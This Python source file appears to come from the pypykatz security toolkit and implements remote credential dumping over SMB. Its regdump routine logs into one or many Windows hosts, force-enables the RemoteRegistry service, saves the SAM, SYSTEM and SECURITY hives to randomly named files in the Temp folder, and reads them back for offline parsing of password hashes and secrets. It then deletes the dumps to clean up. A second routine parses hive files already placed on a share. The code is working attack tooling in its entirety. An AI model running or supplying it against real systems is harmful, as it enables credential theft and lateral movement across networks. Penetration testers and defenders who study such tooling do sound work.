
import asyncio
import os

from pypykatz import logger
from aiosmb.examples.smbshareenum import SMBFileEnum, ListTargetGen, FileTargetGen


async def regdump(url, hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY'], remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\', enable_wait = 3, targets = [], worker_cnt = 5):
	from aiosmb.commons.connection.factory import SMBConnectionFactory
	
	base_url = None
	base_conn = None
	mimis = []
	workers = []

	tgens = []
	if targets is not None and len(targets) != 0:
		notfile = []
		if targets is not None:
			for target in targets:
				try:
					f = open(target, 'r')
					f.close()
					tgens.append(FileTargetGen(target))
				except:
					notfile.append(target)
			
			if len(notfile) > 0:
				tgens.append(ListTargetGen(notfile))

	if isinstance(url, SMBConnectionFactory):
		base_url = url
		base_conn = url.get_connection()
	else:
		base_url = SMBConnectionFactory.from_url(url)
		base_conn = base_url.get_connection()
	
	regdump_coro = regdump_single(
		base_conn.target.get_hostname_or_ip(), 
		base_conn, 
		hives = hives, 
		remote_base_path = remote_base_path, 
		remote_share_name = remote_share_name, 
		enable_wait = enable_wait
	)
	workers.append(regdump_coro)

	for tgen in tgens:
		async for _, target, err in tgen.generate():
			tconn = base_url.create_connection_newtarget(target)
			regdump_coro = regdump_single(
				tconn.target.get_hostname_or_ip(),
				tconn, 
				hives = hives, 
				remote_base_path = remote_base_path, 
				remote_share_name = remote_share_name, 
				enable_wait = enable_wait
			)
			workers.append(regdump_coro)
			if len(workers) >= worker_cnt:
				tres = await asyncio.gather(*workers)
				for res in tres:
					yield res
				workers = []

	if len(workers) > 0:
		tres = await asyncio.gather(*workers)
		for res in tres:
			yield res
		workers = []


async def regdump_single(targetid, connection, hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY'], remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\', enable_wait = 3):
	try:
		from aiosmb.commons.interfaces.machine import SMBMachine
		from aiosmb.commons.interfaces.file import SMBFile
		from aiosmb.dcerpc.v5.common.service import ServiceStatus
		from pypykatz.alsadecryptor.asbmfile import SMBFileReader
		from pypykatz.registry.aoffline_parser import OffineRegistry

		
		if remote_base_path.endswith('\\') is False:
			remote_base_path += '\\'

		if remote_share_name.endswith('\\') is False:
			remote_share_name += '\\'

		po = None

		async with connection:
			logger.debug('[REGDUMP] Connecting to server...')
			_, err = await connection.login()
			if err is not None:
				raise err
			
			logger.debug('[REGDUMP] Connected to server!')
			async with SMBMachine(connection) as machine:
				logger.debug('[REGDUMP] Checking remote registry service status...')
				status, err = await machine.check_service_status('RemoteRegistry')
				if err is not None:
					raise err
				
				logger.debug('[REGDUMP] Remote registry service status: %s' % status.name)
				if status != ServiceStatus.RUNNING:
					logger.debug('[REGDUMP] Enabling Remote registry service')
					_, err = await machine.enable_service('RemoteRegistry')
					if err is not None:
						raise err
					logger.debug('[REGDUMP] Starting Remote registry service')
					_, err = await machine.start_service('RemoteRegistry')
					if err is not None:
						raise err

					await asyncio.sleep(enable_wait)

				
				
				logger.debug('[REGDUMP] Remote registry service should be running now...')
				files = {}
				for hive in hives:
					fname = '%s.%s' % (os.urandom(4).hex(), os.urandom(3).hex())
					remote_path = remote_base_path + fname
					remote_sharepath = remote_share_name + fname
					remote_file = SMBFileReader(SMBFile.from_remotepath(connection, remote_sharepath))
					files[hive.split('\\')[1].upper()] = remote_file
					
					logger.info('[REGDUMP] Dumping reghive %s to (remote) %s' % (hive, remote_path))
					_, err = await machine.save_registry_hive(hive, remote_path)
					if err is not None:
						raise err
				
				#await asyncio.sleep(1)
				for rfilename in files:
					rfile = files[rfilename]
					logger.debug('[REGDUMP] Opening reghive file %s' % rfilename)
					_, err = await rfile.open(connection)
					if err is not None:
						raise err
				
				try:
					logger.debug('[REGDUMP] Parsing hives...')
					po = await OffineRegistry.from_async_reader(
						files['SYSTEM'], 
						sam_reader = files.get('SAM'), 
						security_reader = files.get('SECURITY'), 
						software_reader = files.get('SOFTWARE')
					)
				except Exception as e:
					print(e)
				
				logger.debug('[REGDUMP] Hives parsed OK!')
				
				logger.debug('[REGDUMP] Deleting remote files...')
				err = None
				for rfilename in files:
					rfile = files[rfilename]
					err = await rfile.close()
					if err is not None:
						logger.info('[REGDUMP] ERR! Failed to close hive dump file! %s' % rfilename)

					_, err = await rfile.delete()
					if err is not None:
						logger.info('[REGDUMP] ERR! Failed to delete hive dump file! %s' % rfilename)
				
				if err is None:
					logger.info('[REGDUMP] Deleting remote files OK!')
		
		return targetid, po, None
	except Exception as e:
		return targetid, None, e

			

async def regfile(url, system, sam = None, security = None, software = None, smb_basepath = None):
	from aiosmb.commons.connection.factory import SMBConnectionFactory
	from aiosmb.commons.interfaces.file import SMBFile
	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
	from pypykatz.registry.aoffline_parser import OffineRegistry

	smburl = SMBConnectionFactory.from_url(url)
	connection = smburl.get_connection()

	if smb_basepath is None:
		smb_basepath = smburl.path
	if smb_basepath.endswith('/') is False:
		smb_basepath += '/'
	smb_basepath = smb_basepath.replace('/', '\\')
			
	system_smbfile_path = smb_basepath + system
	sam_smbfile = None
	security_smbfile = None
	software_smbfile = None


	system_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, system_smbfile_path))

	if sam:
		sam_smbfile_path = smb_basepath + sam
		sam_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, sam_smbfile_path))
			
	if security:
		security_smbfile_path = smb_basepath + security
		security_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, security_smbfile_path))
			
	if software:
		software_smbfile_path = smb_basepath + software
		software_smbfile = SMBFileReader(SMBFile.from_remotepath(connection, software_smbfile_path))

	po = None
	async with connection:
		logger.debug('[REGFILE] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logger.debug('[REGFILE] Connected to server!')
		logger.debug('[REGFILE] Opening SYSTEM hive dump file...')
		# parse files here
		_, err = await system_smbfile.open(connection)
		if err is not None:
			raise err

		if sam_smbfile is not None:
			logger.debug('[REGFILE] Opening SAM hive dump file...')
			_, err = await sam_smbfile.open(connection)
			if err is not None:
				raise err
				
		if security_smbfile is not None:
			logger.debug('[REGFILE] Opening SECURITY hive dump file...')
			_, err = await security_smbfile.open(connection)
			if err is not None:
				raise err
				
		if software_smbfile is not None:
			logger.debug('[REGFILE] Opening SOFTWARE hive dump file...')
			_, err = await software_smbfile.open(connection)
			if err is not None:
				raise err
		
		logger.debug('[REGFILE] All files opened OK!')
		logger.debug('[REGFILE] Parsing hive files...')
		po = await OffineRegistry.from_async_reader(system_smbfile, sam_reader = sam_smbfile, security_reader = security_smbfile, software_reader = software_smbfile)
		logger.debug('[REGFILE] Hive files parsed OK!')

	return po
